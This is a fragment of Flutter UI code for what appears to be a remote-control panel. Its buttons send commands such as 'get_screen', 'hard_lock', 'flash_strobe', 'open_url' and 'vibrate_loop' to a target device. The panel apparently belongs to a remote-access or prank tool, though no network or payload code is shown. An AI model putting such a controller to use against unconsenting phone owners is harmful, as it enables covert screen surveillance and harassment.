            _buildActionButton("Stream", Icons.screenshot, accentBlue, "get_screen", targetId),
            _buildActionButton("Wallpaper", Icons.image, accentBlue, "set_wallpaper", targetId),
            _buildActionButton("Strobe ON", Icons.flash_on, neonBlue, "flash_strobe", targetId),
            _buildActionButton("Strobe OFF", Icons.flash_off, accentBlue, "stop_strobe", targetId),
          ]),

          _buildControlBlock("REMOTE", "Lock & Vibrate", 
            Icons.smartphone, neonBlue, [
            _buildActionButton("Lock", Icons.lock, neonBlue, "hard_lock", targetId),
            _buildActionButton("Unlock", Icons.lock_open, accentBlue, "unlock", targetId),
            _buildActionButton("Link", Icons.link, accentBlue, "open_url", targetId),
            _buildActionButton("Vibrate", Icons.vibration, neonBlue, "vibrate_loop", targetId),
          ]),
        ],
      ),
    );
  }
}